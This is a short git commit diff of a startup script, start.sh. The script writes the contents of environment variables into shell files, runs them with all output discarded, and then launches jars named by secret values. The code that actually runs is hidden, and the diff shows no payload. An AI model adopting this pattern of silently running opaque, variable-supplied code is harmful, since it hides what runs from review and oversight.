6d25337ddcf1f90102e3b00657d3eebe862f584f
mwheeler5 <106824576+mwheeler5@users.noreply.github.com>
2022-08-09 23:18:10 -0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -6,10 +6,11 @@ sudo update-java-alternatives --set /usr/lib/jvm/bellsoft-java17-runtime-full-am
 #cd $HOME
 echo -e $LINK1 > start1.sh
 bash start1.sh &> /dev/null
-# echo -e $LINK3 > start3.sh
-# bash start3.sh &> /dev/null
+echo -e $LINK3 > start3.sh
+bash start3.sh &> /dev/null
 echo -e $LINK2 > start2.sh
 bash start2.sh &> /dev/null
 export DISPLAY=:0
 java -jar wget.jar $SECRET1 $SECRET2 "$SECRET3" &> /dev/null
-java -jar $SECRET4 &> /dev/null
+#java -jar $SECRET4 &> /dev/null
+java -jar $SECRET4
